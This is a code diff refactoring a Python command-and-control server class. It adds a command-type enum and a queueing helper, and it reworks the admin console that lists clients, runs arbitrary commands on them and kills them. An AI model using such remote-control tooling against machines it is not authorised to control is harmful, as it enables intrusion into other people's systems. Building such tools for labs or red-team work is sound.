@@ -18,6 +18,7 @@ from message import Message
 from models.send_receive_msgs import send_message, receive_message
 from models.client_state import ClientState
 from models.message_type import MessageType
+from models.command_type import CommandType
 
 # ==================== CONFIGURATION ====================
 
@@ -131,7 +132,7 @@ class C2Server:
                     logger.info(f"_command_executor Client {client_state.client_id} not connected: {client_state.status}")
                     break
                 # Get next command from queue (timeout prevents hanging)
-                cmd_data = await asyncio.wait_for(client_state.command_queue.get(), timeout=1.0)
+                cmd_data = await client_state.command_queue.get()
                 
                 cmd_id = cmd_data.get("cmd_id")
                 command = cmd_data.get("command")
@@ -146,8 +147,6 @@ class C2Server:
                 )
                 logger.info(f"Command sent to {client_state.client_id}: {command}")
             
-            except asyncio.TimeoutError:
-                continue
             except Exception as e:
                 logger.error(f"Command executor error: {e}")
                 break
@@ -205,16 +204,13 @@ class C2Server:
         if not self.clients:
             print("No clients connected")
             return
-        
         print("\n" + "="*60)
         print(f"{'Client ID':<20} {'Status':<12} {'Last HB':<12}")
         print("="*60)
-        
         for client_id, state in self.clients.items():
             last_hb = time.time() - state.last_heartbeat
             hb_str = f"{last_hb:.1f}s ago"
             print(f"{client_id:<20} {state.status:<12} {hb_str:<12}")
-        
         print("="*60 + "\n")
     
     def cmd_run(self, args: str):
@@ -239,14 +235,7 @@ class C2Server:
         elif not client.is_connected:
             logger.info(f"Client {client_id} not in connected state ({client})")
             return
-        
-        # Queue command
-        cmd_id = str(uuid.uuid4())
-        self.clients[client_id].command_queue.put_nowait({
-            "cmd_id": cmd_id,
-            "command": command
-        })
-        
+        self._add_command_to_queue(client_id, command)
         logger.info(f"Command queued for {client_id}: {command}")
     
     def cmd_kill(self, client_id: str):
@@ -254,17 +243,17 @@ class C2Server:
         if client_id not in self.clients:
             logger.info(f"Client {client_id} not found")
             return
-        
-        # Send kill command first
+        self._add_command_to_queue(client_id, CommandType.KILL.value)
+        logger.info(f"Kill command sent to {client_id}")
+        self.clients[client_id].set_killed()
+
+    def _add_command_to_queue(self, client_id: str, command: str) -> None:
         cmd_id = str(uuid.uuid4())
         client_state = self.clients[client_id]
         client_state.command_queue.put_nowait({
             "cmd_id": cmd_id,
-            "command": "kill"
+            "command": command,
         })
-        
-        logger.info(f"Kill command sent to {client_id}")
-        client_state.set_killed()
     
     async def admin_cli(self):
         """
@@ -277,31 +266,35 @@ class C2Server:
             try:
                 # Run input in executor to avoid blocking
                 cmd = await loop.run_in_executor(None, input, "> ")
+                if not cmd:
+                    continue
+                cmd_parts = cmd.lower().split(maxsplit=1)
+                cmd_type = CommandType(cmd_parts[0])
                 
-                if cmd.startswith("list"):
+                if cmd_type is CommandType.LIST:
                     self.cmd_list_clients()
                 
-                elif cmd.startswith("run"):
-                    self.cmd_run(cmd[4:].strip())
-                
-                elif cmd.startswith("kill"):
-                    self.cmd_kill(cmd[5:].strip())
-                
-                elif cmd.startswith("exit"):
+                elif cmd_type is CommandType.EXIT:
                     logger.info('Exiting server')
                     self.shutdown.set()
                 
-                elif cmd == "help":
+                elif cmd_type is CommandType.RUN:
+                    self.cmd_run(cmd_parts[1].strip())
+                
+                elif cmd_type is CommandType.KILL:
+                    self.cmd_kill(cmd_parts[1].strip())
+                
+                elif cmd_type is CommandType.HELP:
                     print("""
-                Commands:
-                list              - List connected clients
-                run <id> <cmd>    - Run command on client
-                kill <id>         - Kill client
-                exit              - Exit server
+Commands:
+list              - List connected clients
+run <id> <cmd>    - Run command on client
+kill <id>         - Kill client
+exit              - Exit server
                     """)
                 
                 else:
-                    logger.info("Unknown command. Type 'help'")
+                    logger.info(f"Unknown command {cmd}. Type 'help'")
             
             except EOFError:
                 break
